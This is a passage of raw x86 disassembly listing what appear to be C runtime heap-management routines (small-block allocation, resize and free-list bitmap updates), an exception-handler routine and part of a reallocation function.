  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
